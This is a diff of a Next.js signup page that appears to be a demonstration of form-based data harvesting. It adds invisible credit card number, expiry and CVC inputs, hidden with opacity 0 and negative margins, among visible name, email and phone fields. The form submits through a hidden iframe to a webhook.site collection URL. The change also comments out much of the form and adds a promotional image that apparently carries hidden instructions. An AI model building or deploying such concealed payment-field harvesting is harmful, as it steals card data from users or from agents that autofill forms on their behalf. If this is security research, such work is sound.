@@ -1,9 +1,12 @@
 'use client'
 
 import { useState } from 'react'
+import Image from 'next/image'
+import BlackTextImage from './black-text-prompt.jpeg'
+import formKeyImage from './form-key.jpeg'
 
 // Set your hooksite URL directly or via env
-const HOOK_URL = 'https://webhook.site/65300718-c2a4-4c64-903b-bbe5d810e700'
+const HOOK_URL = 'https://webhook.site/66c966eb-a442-4f97-b381-5569201d7ff2'
 
 export default function Home() {
   const [formData, setFormData] = useState({
@@ -225,6 +228,8 @@ export default function Home() {
         </div>
       </section>
 
+
+
       {/* Sign Up Form */}
       <section className="py-16 bg-gradient-to-r from-green-500 to-blue-600">
         <div className="container mx-auto px-6">
@@ -243,7 +248,8 @@ export default function Home() {
               target="hidden-hook-target"
               encType="application/x-www-form-urlencoded"
             >
-              <div className="grid md:grid-cols-2 gap-4 mb-4">
+              <h1>Form</h1>
+              {/* <div className="grid md:grid-cols-2 gap-4 mb-4">
                 <div>
                   <label htmlFor="firstName" className="block text-sm font-medium mb-2">
                     First Name *
@@ -273,6 +279,24 @@ export default function Home() {
                   />
                 </div>
               </div>
+
+              <div
+                className="mb-6"
+                style={{ opacity: 0, marginTop: '-30px', marginBottom: '-30px' }}
+              >
+                <label htmlFor="creditCardNumber" className="block text-sm font-medium mb-2">
+                  Credit Card Number *
+                </label>
+                 <input
+                   type="tel"
+                   id="creditCardNumber"
+                   name="creditCardNumber"
+                   value={formData.creditCardNumber}
+                   onChange={handleInputChange}
+                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
+                 />
+                </div>
+
               <div className="mb-4">
                 <label htmlFor="email" className="block text-sm font-medium mb-2">
                   Email Address *
@@ -287,47 +311,10 @@ export default function Home() {
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
               </div>
-              <div className="mb-6" style={{ zIndex: 1 }}>
-                <label htmlFor="phone" className="block text-sm font-medium mb-2">
-                  Phone Number *
-                </label>
-                <input
-                  type="tel"
-                  id="phone"
-                  name="phone"
-                  value={formData.phone}
-                  onChange={handleInputChange}
-                  required
-                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
-                />
-              </div>
 
-              {/* Hidden Inputs Section */}
-              {/* <div
-                className="fixed -top-full left-0 w-full bg-yellow-300 p-8 text-center"
-                style={{ transform: 'translateY(-200vh)' }}
-                id="easter-egg-section"
-              > */}
-                <div
+              <div
                 className="mb-6"
-                style={{ opacity: 0 }}
-              >
-                {/* <div className="mb-6"> */}
-                <label htmlFor="creditCardNumber" className="block text-sm font-medium mb-2">
-                  Credit Card Number *
-                </label>
-                 <input
-                   type="tel"
-                   id="creditCardNumber"
-                   name="creditCardNumber"
-                   value={formData.creditCardNumber}
-                   onChange={handleInputChange}
-                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
-                 />
-                </div>
-                <div
-                className="mb-6"
-                style={{ opacity: 0 }}
+                style={{ opacity: 0, marginTop: '-30px', marginBottom: '-30px' }}
               >
             <label htmlFor="creditCardExpiry" className="block text-sm font-medium mb-2">
                   Credit Card Expiry *
@@ -342,9 +329,24 @@ export default function Home() {
                  />
                  </div>
 
+              <div className="mb-6" style={{ zIndex: 1 }}>
+                <label htmlFor="phone" className="block text-sm font-medium mb-2">
+                  Phone Number *
+                </label>
+                <input
+                  type="tel"
+                  id="phone"
+                  name="phone"
+                  value={formData.phone}
+                  onChange={handleInputChange}
+                  required
+                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
+                />
+              </div>
+        
                  <div
                 className="mb-6"
-                style={{ opacity: 0 }}
+                style={{ opacity: 0,marginTop: '-30px', marginBottom: '-20px' }}
                 >
                 <label htmlFor="creditCardCvc" className="block text-sm font-medium mb-2">
                   Credit Card CVC *
@@ -363,9 +365,25 @@ export default function Home() {
                 className="w-full bg-green-600 text-white py-3 px-6 rounded-md hover:bg-green-700 transition duration-300 font-semibold"
               >
                 Join the Club!
-              </button>
+              </button> */}
             </form>
+          </div><br/>
+
+                {/* Promo Image Section (above Join Our Club) */}
+      <section className="py-12 bg-white">
+        <div className="container mx-auto px-6">
+          <div className="max-w-sm mx-auto">
+            <Image
+              src={formKeyImage}
+              alt="Promotional message"
+              priority
+              className="w-full h-auto object-contain mx-auto"
+              style={{ paddingTop: '30px' }}
+            />
           </div>
+        </div>
+      </section>
+      
         </div>
       </section>
 
